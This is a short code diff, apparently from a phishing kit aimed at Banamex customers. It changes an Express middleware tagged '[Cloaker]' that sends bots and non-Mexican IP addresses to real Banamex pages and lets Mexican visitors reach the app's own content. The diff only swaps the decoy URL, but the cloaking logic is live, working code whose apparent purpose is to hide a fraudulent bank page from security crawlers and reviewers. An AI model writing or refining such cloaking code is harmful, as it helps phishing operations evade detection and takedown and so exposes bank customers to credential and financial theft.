@@ -139,20 +139,20 @@ app.use((req, res, next) => {
     
     const isBot = botPatterns.some(pattern => pattern.test(userAgent));
 
-    // Si es un bot, redirigir a BancaNet Empresarial
+    // Si es un bot, redirigir a Aclaraciones Banamex
     if (isBot) {
       console.log(`[Cloaker] Bot detectado: ${userAgent.substring(0, 50)} - IP: ${clientIp}`);
-      return res.redirect('https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm');
+      return res.redirect('https://www.banamex.com/sitios/aclaraciones-cargos-tarjetas/');
     }
 
     // Obtener información de geolocalización
     const geo = geoip.lookup(clientIp);
     
-    // Si no se puede determinar la ubicación O no es de México, redirigir a BancaNet Empresarial
+    // Si no se puede determinar la ubicación O no es de México, redirigir a Aclaraciones Banamex
     if (!geo || geo.country !== 'MX') {
       const country = geo?.country || 'Desconocido';
       console.log(`[Cloaker] IP no mexicana detectada: ${clientIp} (${country})`);
-      return res.redirect('https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm');
+      return res.redirect('https://www.banamex.com/sitios/aclaraciones-cargos-tarjetas/');
     }
 
     // Si es de México y no es bot, permitir acceso
